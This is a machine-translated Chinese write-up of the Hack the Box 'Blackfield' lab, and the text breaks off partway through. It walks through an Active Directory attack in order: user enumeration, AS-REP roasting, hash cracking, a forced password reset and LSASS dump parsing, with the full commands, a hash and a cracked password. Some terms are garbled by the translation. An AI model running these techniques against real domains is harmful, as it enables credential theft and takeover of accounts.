<html>
<head>
<title>Hack the Box — Blackfield</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑掉盒子——布莱克菲尔德</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hack-the-box-blackfield-35b64183a696?source=collection_archive---------1-----------------------#2020-10-03">https://infosecwriteups.com/hack-the-box-blackfield-35b64183a696?source=collection_archive---------1-----------------------#2020-10-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/816f7ce6ef2bdc6dc041ac5337450e8d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ft1ne45FTLgvodl9xDcT1w.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><a class="ae kc" href="https://www.hackthebox.eu/home/machines/profile/255" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/255</a></figcaption></figure><p id="2078" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Blackfield是Hack the Box的40分机器，它要求你利用最近在机器上进行的计算机取证调查后所犯的错误。这些文件留下了关于机器的有价值的信息，通常是在进行计算机取证时提取的，其中包括LSASS的转储。如果所有的密码都被更改了，那么访问系统转储将变得毫无意义，但事实并非如此。为了获得机器上的系统，我滥用了SEBackupPrivilege来获得NTDS.dit的副本，并解析它以获得管理员散列。</p><h1 id="3a07" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">总结一下解决箱子问题的步骤:</h1><p id="3856" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated"><strong class="kf ir">初始立足点:</strong></p><ul class=""><li id="7b4a" class="me mf iq kf b kg kh kk kl ko mg ks mh kw mi la mj mk ml mm bi translated">识别有效的域用户</li><li id="c1cf" class="me mf iq kf b kg mn kk mo ko mp ks mq kw mr la mj mk ml mm bi translated">砷焙烧</li><li id="584f" class="me mf iq kf b kg mn kk mo ko mp ks mq kw mr la mj mk ml mm bi translated">强制更改用户的密码</li></ul><p id="9985" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir"> audit2020 → svc_backup: </strong></p><ul class=""><li id="f30b" class="me mf iq kf b kg kh kk kl ko mg ks mh kw mi la mj mk ml mm bi translated">从转储文件中提取密码</li></ul><p id="e275" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">SVC _ backup→管理员:</strong></p><ul class=""><li id="3826" class="me mf iq kf b kg kh kk kl ko mg ks mh kw mi la mj mk ml mm bi translated">滥用备份特权提取NTDS。DIT和系统配置单元</li><li id="13fc" class="me mf iq kf b kg mn kk mo ko mp ks mq kw mr la mj mk ml mm bi translated">使用<code class="fe ms mt mu mv b">secretsdump</code>提取域哈希</li></ul><h1 id="b770" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">扫描:</h1><p id="cc99" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">我首先从<code class="fe ms mt mu mv b">masscan</code>开始识别机器中打开的端口:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="ee39" class="ne lc iq mv b gy nf ng l nh ni">sudo masscan -p1-65535,U:1-65535 10.10.10.192 --rate=1000 -e tun0 </span></pre><p id="10d7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">结果如下:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="946b" class="ne lc iq mv b gy nf ng l nh ni">Discovered open port 389/tcp on 10.10.10.192                                    Discovered open port 53/udp on 10.10.10.192                                     Discovered open port 445/tcp on 10.10.10.192                                    Discovered open port 5985/tcp on 10.10.10.192                                   Discovered open port 53/tcp on 10.10.10.192                                     Discovered open port 593/tcp on 10.10.10.192                                    Discovered open port 135/tcp on 10.10.10.192                                    Discovered open port 3268/tcp on 10.10.10.192                                   Discovered open port 88/tcp on 10.10.10.192</span></pre><p id="da88" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">根据打开的端口，我最有可能处理的是一个域控制器。然后，我可以将其输出保存在一个文件中，并解析以仅获得端口号:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="405c" class="ne lc iq mv b gy nf ng l nh ni">sif0@kali:~/htb/boxes/Blackfield-10.10.10.192$ cat masscan.out |cut -d "/" -f 1 | cut -d " " -f 4 | paste -s -d, - 389,53,445,5985,53,593,135,3268,88</span></pre><p id="f633" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我运行<code class="fe ms mt mu mv b">Nmap</code>来了解更多关于开放端口的信息:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="4813" class="ne lc iq mv b gy nf ng l nh ni">sif0@kali:~/htb/boxes/Blackfield-10.10.10.192$ mkdir nmap; sudo nmap -sV -sC 10.10.10.192 -oA nmap/blackfield -vv -n -p 389,53,445,5985,593,135,3268,88</span></pre><p id="b8ae" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe ms mt mu mv b">Nmap</code>结果信息不多。蝙蝠没有弱点。然后我使用<code class="fe ms mt mu mv b">ldapsearch</code>来获得更多领域相关的信息。总结一下:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="2609" class="ne lc iq mv b gy nf ng l nh ni">DOMAIN: Blackfield<br/>FQDN: Blackfield.local <br/>DC: DC01.blackfield.local</span></pre><h2 id="dd5c" class="ne lc iq bd ld nj nk dn lh nl nm dp ll ko nn no lp ks np nq lt kw nr ns lx nt bi translated">SMB枚举</h2><p id="b694" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">我尝试列举是否有有趣的中小企业共享:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nu"><img src="../Images/f64001419137e7c042d0476c18ac4cc6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rZciMzdmPVIrdnGWqEOCQg.png"/></div></div></figure><p id="b8e5" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这里的非默认共享是“forensic”和“profile$”。然后，我继续检查forensic共享下有什么，但是我没有足够的权限。检查另一个共享:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nv"><img src="../Images/25d1b162e12f02cc47672d108ffe2ef1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4YyhpYITS78Q4a-muXHtdA.png"/></div></div></figure><p id="676b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">鉴于它可能是潜在的用户名，因为它遵循在Active Directory中创建用户名的常见方式<em class="nw"> F.LastName </em>的格式，我将这些名称放在一个文件中，以识别所有这些用户名是否有效。</p><h2 id="116d" class="ne lc iq bd ld nj nk dn lh nl nm dp ll ko nn no lp ks np nq lt kw nr ns lx nt bi translated">使用Kerberos的用户名枚举</h2><p id="2960" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">我可以使用<code class="fe ms mt mu mv b"><a class="ae kc" href="https://github.com/ropnop/kerbrute" rel="noopener ugc nofollow" target="_blank">Kerbrute</a></code>枚举有效的用户名，这基本上滥用了Kerberos如何响应来识别用户是否有效。</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="8312" class="ne lc iq mv b gy nf ng l nh ni">kerbrute_linux_386 userenum --dc 10.10.10.192 -d blackfield.local users.txt --safe -v</span></pre><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nx"><img src="../Images/721c87e82062e0e46379f1d3732f7cfa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TWA0xwVCP0TnuW6nE0CdWw.png"/></div></div></figure><p id="6a2a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最终，314个用户名中只有3个有效。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ny"><img src="../Images/473063020b8d51bde52d96b8c313b66d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RgS3oDfJFM_qpieGwj2k-g.png"/></div></div></figure><p id="58c1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">或者，我可以使用<code class="fe ms mt mu mv b">Metasploit</code>中的一个辅助模块来做同样的事情:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="55ed" class="ne lc iq mv b gy nf ng l nh ni">msf5 auxiliary(gather/kerberos_enumusers) &gt;</span></pre><p id="aef3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这会给你同样的结果，但是<code class="fe ms mt mu mv b">Kerbrute</code>要稳定得多(或者Impacket的GetNPUsers.py)。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nz"><img src="../Images/a8f2345c2f71f70a87e09f619979dbd3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jx75m1CRO4kGR07TgjbVRw.png"/></div></div></figure><p id="3b2b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">所以只有3个有效用户:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="2b67" class="ne lc iq mv b gy nf ng l nh ni"><strong class="mv ir">audit2020<br/>svc_backup<br/>support</strong></span></pre><h2 id="e629" class="ne lc iq bd ld nj nk dn lh nl nm dp ll ko nn no lp ks np nq lt kw nr ns lx nt bi translated">砷焙烧</h2><p id="2f8f" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">然后我检查了这些用户中是否有人容易受到AS-REP烘烤，我已经在我的<a class="ae kc" href="https://medium.com/bugbountywriteup/hackthebox-forest-5a11553de1" rel="noopener">森林文章</a>中讨论过了。我使用了<code class="fe ms mt mu mv b">Impacket’s </code> GetNPUsers.py:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="fafb" class="ne lc iq mv b gy nf ng l nh ni">GetNPUsers.py blackfield.local/ -usersfile real-users.txt -dc-ip 10.10.10.192</span></pre><p id="ad09" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">由于用户<code class="fe ms mt mu mv b">support</code>易受攻击，DC给了我们一个TGS，我们可以尝试破解它以获得明文密码。</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="f2f5" class="ne lc iq mv b gy nf ng l nh ni">[-] User <strong class="mv ir">audit2020 </strong>doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$<strong class="mv ir">support</strong>@BLACKFIELD.LOCAL:e6dfe911ddb2bd2631db466196100954$360cd4940e6f7b574aa0a1cadde4a74dd1320b85cd9d043c14260c62558fc409a4b0015132514b3e5aca159bed53c2716ac70da1abc8b8657d959450ad1e69eca2d51209157c977183b1b0465545f9f5dc3a70d00c0c2f713010a5fcba856615f671896f181709a581273c4f85214205ca84760a4650eebd545b62d7562a8a62c2f39d3a502a4411390df2f7cc5abe997fa06e384500925d5486bbba4aa5c4279d28560905434d99d30ba70dec2b237302ac3d32cfca19e9065a6a0544d9be93c6c034820293557679531fcbd2cebdef926630833716e4b658a43b573bd4d018c53d7083213f6c45f524ab327163f71bb05e6277 [-] User <strong class="mv ir">svc_backup </strong>doesn't have UF_DONT_REQUIRE_PREAUTH set</span></pre><p id="3dad" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">使用<code class="fe ms mt mu mv b">hashcat</code>，它出现裂缝:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="8187" class="ne lc iq mv b gy nf ng l nh ni">hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt </span><span id="f4f7" class="ne lc iq mv b gy oa ng l nh ni">..&lt;snip&gt;..</span><span id="2268" class="ne lc iq mv b gy oa ng l nh ni">$krb5asrep$23$support@BLACKFIELD.LOCAL:e6dfe911ddb2bd2631db466196100954$360cd4940e6f7b574aa0a1cadde4a74dd1320b85cd9d043c14260c62558fc409a4b0015132514b3e5aca159bed53c2716ac70da1abc8b8657d959450ad1e69eca2d51209157c977183b1b0465545f9f5dc3a70d00c0c2f713010a5fcba856615f671896f181709a581273c4f85214205ca84760a4650eebd545b62d7562a8a62c2f39d3a502a4411390df2f7cc5abe997fa06e384500925d5486bbba4aa5c4279d28560905434d99d30ba70dec2b237302ac3d32cfca19e9065a6a0544d9be93c6c034820293557679531fcbd2cebdef926630833716e4b658a43b573bd4d018c53d7083213f6c45f524ab327163f71bb05e6277:<strong class="mv ir">#00^BlackKnight</strong></span></pre><p id="b21e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在我有了用户<code class="fe ms mt mu mv b">support</code>的密码，我知道我有1个有效的域凭证。在Active Directory环境中，访问一个有效的凭据允许您枚举和收集大量关于域的信息。我用<code class="fe ms mt mu mv b">ldapsearch</code>进一步列举。</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="8695" class="ne lc iq mv b gy nf ng l nh ni">ldapsearch -x -h 10.10.10.192 -D 'BLACKFIELD\support' -w '#00^BlackKnight' -b "DC=BLACKFIELD,DC=LOCAL"</span></pre><p id="8c45" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为了简洁起见，我没有在这里包括输出，只是想展示如何使用<code class="fe ms mt mu mv b">ldapsearch</code>进行枚举。原因是当使用<code class="fe ms mt mu mv b">ldapsearch</code>进行调查时，有一些属性很容易被发现，而<code class="fe ms mt mu mv b">ldapdomaindump </code>并没有将这些属性包含在它的输出中。使用<code class="fe ms mt mu mv b">ldapdomaindump </code>的好处是看起来很舒服。为了使事情变得简单，我使用<code class="fe ms mt mu mv b">ldapdomaindump </code>来收集关于领域的信息:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="7397" class="ne lc iq mv b gy nf ng l nh ni">ldapdomaindump ldap://10.10.10.192 -u "BLACKFIELD\support" -p "#00^BlackKnight" --no-json --no-grep -o ldapdomaindump</span><span id="6a00" class="ne lc iq mv b gy oa ng l nh ni">[*] Connecting to host...<br/>[*] Binding to host<br/>[+] Bind OK<br/>[*] Starting domain dump<br/>[+] Domain dump finished</span></pre><p id="cfd8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">研究domain_users.html文件，其中提到了机器创建者(kudos，这个框很棒)和关于用户<code class="fe ms mt mu mv b">svc_backup </code>是<code class="fe ms mt mu mv b">Remote Management Users</code>成员的信息，这意味着用户可以使用PowerShell Remoting在机器上执行命令。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ob"><img src="../Images/8ac4bd92ff831daccfc14ad66e787d24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5xIZ61U9hFoIixtmn473eg.png"/></div></div></figure><p id="38d4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">检查另外两个有效用户的信息，我们可以看到<code class="fe ms mt mu mv b">DONT_REQ_PREAUTH </code>被设置在<code class="fe ms mt mu mv b">support </code>用户上，这就是为什么它容易受到AS-REP烘烤的原因。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oc"><img src="../Images/ecb04b5eb29b3fcbf6c04eb26ea7e5d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wjT4kZ9piBpFC9DuKqb5lQ.png"/></div></div></figure><p id="9a4a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">此外，由于我有一个有效的域用户，我可以运行<code class="fe ms mt mu mv b">Bloodhound </code>来了解关于该域的更多信息。因为我还没有在机器上执行代码，所以我不能使用SharpHound ingestor(因为我没有在加入域的Windows机器上，但我认为如果你让你的Linux机器与Kerberos对话，这仍然是可能的),但有一个基于Python3的ingestor就足够了。</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="0a34" class="ne lc iq mv b gy nf ng l nh ni">bloodhound-python -u support -p "#00^BlackKnight" -ns 10.10.10.192 -d blackfield.local -c all</span></pre><figure class="mw mx my mz gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/d78be5469e342bd9545460f19ca68ccf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1114/format:webp/1*e8SkjmeDHW-6tvI_YRT1NQ.png"/></div></figure><p id="4229" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在Bloodhound GUI上加载数据，似乎<code class="fe ms mt mu mv b">support </code>用户可以强制更改用户audit2020的密码。一个用户对另一个用户的这种控制非常普遍，因为帮助台或支持角色能够重置用户的密码(因为用户经常忘记他们的密码)。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oe"><img src="../Images/939b8891017baef65242668637c5ef60.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bq0lRBKig79LXLFLY-Gypg.png"/></div></div></figure><p id="2496" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">点击帮助:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="6558" class="ne lc iq mv b gy nf ng l nh ni">The user SUPPORT<a class="ae kc" href="http://twitter.com/BLACKFIELD" rel="noopener ugc nofollow" target="_blank">@BLACKFIELD</a>.LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.</span></pre><p id="cca7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">此外，<code class="fe ms mt mu mv b">svc_backup </code>用户是<code class="fe ms mt mu mv b"><a class="ae kc" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators" rel="noopener ugc nofollow" target="_blank">Backup Operators</a></code>组的成员，该组是一个特权组，可以被滥用来获取NTDS.dit(存储域哈希的位置)文件的副本。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi of"><img src="../Images/79b1f6d43bb8889b838d3fdb25f22b31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fSafSRJ4eB9CtGLrFY9NWg.png"/></div></div></figure><p id="fecc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，在这里，我可以说这可能是获得管理员权限所需的权限提升。</p><p id="02c3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">使用支持用户强制重置密码</strong></p><p id="0750" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">由于<code class="fe ms mt mu mv b">Bloodhound </code>上的滥用信息需要Powershell和某种形式的代码在任何加入域的机器上执行，我从Linux机器上搜索了其他方式来完成此操作，并发现了以下资源:<a class="ae kc" href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/" rel="noopener ugc nofollow" target="_blank">https://恶意. link/post/2017/reset-ad-user-password-with-Linux/</a></p><p id="4557" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从博客本身，我可以使用<code class="fe ms mt mu mv b">rpcclient</code>重置密码。要连接:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="60c2" class="ne lc iq mv b gy nf ng l nh ni">rpcclient -U support 10.10.10.192</span></pre><p id="448a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">输入密码后，我执行了以下操作:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div class="gh gi og"><img src="../Images/bb489cdd2a934655efebfef19f523de8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1254/format:webp/1*sGwc7XOPrF2FuXnOAMkFmg.png"/></div></figure><p id="a278" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我在修改<code class="fe ms mt mu mv b">svc_backup</code>的密码时被拒绝访问，但成功地将<code class="fe ms mt mu mv b">audit2020</code>的密码修改为“password123！。</p><p id="91d9" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后，我使用<code class="fe ms mt mu mv b">crackmapexec</code>来验证凭证是否在smb上工作:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="51c4" class="ne lc iq mv b gy nf ng l nh ni">cme smb 10.10.10.192 -u audit2020 -p 'password123!' -d blackfield.local</span></pre><p id="4232" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">它工作了，我现在对forensic共享拥有读权限(用户<code class="fe ms mt mu mv b">support </code>没有)。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oh"><img src="../Images/2cd2147eeeab7420820f379e70e1ddb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0g4LEgRU7oPOB38NZAO4PA.png"/></div></div></figure><h2 id="2bdf" class="ne lc iq bd ld nj nk dn lh nl nm dp ll ko nn no lp ks np nq lt kw nr ns lx nt bi translated">从LSASS转储中提取凭据</h2><p id="65a9" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">然后，我使用<code class="fe ms mt mu mv b">smbclient</code>来枚举forensic共享下的文件夹:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oi"><img src="../Images/1e7d7235b4289056be7c7de012d7b540.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UChDa9gCQt6-b5-5Qljqcg.png"/></div></div></figure><p id="2c82" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">看到这里可能有有趣的文件，我试着下载了一下。</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="1b2b" class="ne lc iq mv b gy nf ng l nh ni">smbclient "\\\\10.10.10.192\\forensic" -c "prompt;recurse;mget *" -U=audit2020</span><span id="e6a1" class="ne lc iq mv b gy oa ng l nh ni">Enter WORKGROUP\audit2020's password:  <br/>getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec) </span><span id="dbb9" class="ne lc iq mv b gy oa ng l nh ni">getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec) </span><span id="82f1" class="ne lc iq mv b gy oa ng l nh ni">getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (16.9 KiloBytes/sec) (average 5.1 KiloBytes/sec)</span><span id="dde3" class="ne lc iq mv b gy oa ng l nh ni">..&lt;snip&gt;..</span></pre><p id="5dd6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我认为这些文件是某些易失性模块或命令的输出，但不要相信我的话。然后，我尝试读取其中一个文件，但有趣的是，它被检测为一个二进制文件。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oj"><img src="../Images/a75d9656405d6e4c2c07885488fe2b6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qc9cO8A5CuvF0_VHC8ZQZQ.png"/></div></div></figure><p id="a692" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后想起PowerShell用UTF-16做编码，和Linux不匹配。所以这些文件可能来自PowerShell脚本？接下来，可以使用<code class="fe ms mt mu mv b">iconv</code>进行读取</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="51e8" class="ne lc iq mv b gy nf ng l nh ni">iconv -f utf-16 -t utf-8 domain_admins.txt</span></pre><p id="8a02" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">输出将是:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/cdfee518693cde79e2137b4a78570c49.png" data-original-src="https://miro.medium.com/v2/resize:fit:1142/format:webp/1*VVqvSE6gkp6SD5B6qJb49Q.png"/></div></figure><p id="d6fa" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这些凭证不起作用。这些文件来自计算机取证分析。这表明<code class="fe ms mt mu mv b">Administrator </code>用户受到威胁，其密码被更改为该值。请记住，这些文件来自计算机取证调查，因此这些文件来自机器的先前状态。法医共享上有一些有趣的文件。一个有趣的文件是<code class="fe ms mt mu mv b">lsass.zip</code>文件，它很可能包含提取完成时<code class="fe ms mt mu mv b">lsass.exe</code>进程的转储。当我试图下载它时，我遇到了一些问题:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/68109c34e3b2e4b8062bcb4d43fdb75e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1290/format:webp/1*FoHUDXodbiAP8xlXhvpH8Q.png"/></div></figure><p id="ba06" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后，我尝试了各种易于搜索的选项，但能够使用<code class="fe ms mt mu mv b">smbget</code>进行搜索，这就像中小企业的<code class="fe ms mt mu mv b">wget</code>:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="a148" class="ne lc iq mv b gy nf ng l nh ni">smbget smb://10.10.10.192/forensic/memory_analysis/lsass.zip -U=audit2020%password123\!</span></pre><p id="30e7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">使用7z检查<code class="fe ms mt mu mv b">lsass.zip</code>的内容:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi om"><img src="../Images/3d964daeb9716c1824d5de3fdc372b57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rbl9u5S9uvVv3TBLiGIb3A.png"/></div></div></figure><p id="114a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">它确实包含一个名为<code class="fe ms mt mu mv b">lsass.DMP</code>的文件。</p><p id="c36f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我使用<code class="fe ms mt mu mv b"><a class="ae kc" href="https://github.com/skelsec/pypykatz" rel="noopener ugc nofollow" target="_blank">pypykatz</a></code>解析转储文件:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="6c3c" class="ne lc iq mv b gy nf ng l nh ni">pypykatz lsa minidump /home/sif0/htb/boxes/Blackfield-10.10.10.192/forensic-share/lsass.DMP</span></pre><p id="fd5d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki 